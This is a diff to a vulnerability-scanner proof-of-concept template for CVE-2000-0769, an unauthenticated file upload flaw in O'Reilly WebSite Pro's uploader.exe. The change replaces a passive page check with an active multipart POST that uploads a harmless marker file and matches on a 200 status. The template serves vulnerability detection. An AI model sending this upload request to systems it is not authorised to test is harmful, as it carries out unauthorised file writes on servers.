@@ -1,30 +1,38 @@
 [info]
 author = "AVE"
-description = "检测 O'Reilly WebSite Pro 2.3.7 中 uploader.exe 是否可被未授权访问，该程序允许远程攻击者上传任意文件至服务器"
+description = "检测 O'Reilly WebSite Pro 2.3.7 中 uploader.exe 未授权文件上传漏洞，通过直接调用 uploader.exe 上传任意文件"
 id = "POC-AVE-2000-0917"
 name = "O'Reilly WebSite Pro uploader.exe 任意文件上传 PoC"
 severity = "high"
-tags = ["ave-2000-0917"]
+tags = ["cve-2000-0769"]
 vuln_id = [
     "CVE-2000-0769",
     "AVE-2000-0917",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
-method = "GET"
-path = "/{{BaseURL}}/cgi-win/uploader.exe"
+method = "POST"
+path = "/{{BaseURL}}/uploader.exe"
 protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundaryAVE\r
+Content-Disposition: form-data; name="file"; filename="test.txt"\r
+Content-Type: text/plain\r
+\r
+AVE-POC-TEST\r
+------WebKitFormBoundaryAVE--\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data; boundary=----WebKitFormBoundaryAVE"
 
 [[poc.requests.matchers]]
 expect = true
-part = "body"
-type = "word"
-words = [
-    "upload",
-    "Upload",
-    "file",
-    "browse",
-]
+status = [200]
+type = "status"
